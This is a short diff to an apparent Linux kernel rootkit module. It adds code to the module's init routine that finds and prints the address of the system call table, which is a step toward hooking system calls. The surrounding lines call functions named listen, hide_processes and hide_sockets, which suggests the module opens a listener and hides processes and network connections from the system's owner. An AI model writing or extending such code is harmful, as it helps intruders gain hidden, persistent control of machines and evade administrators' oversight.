@@ -16,7 +16,10 @@
 
 static int __init mod_init(void)
 {
-	printk(KERN_INFO "using syscalltab\n");
+	void ** sct = syscall_table();
+	if(sct != NULL)
+		printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
+	else if(sct == NULL) return 0;
 	listen();
 	hide_processes();
 	hide_sockets();
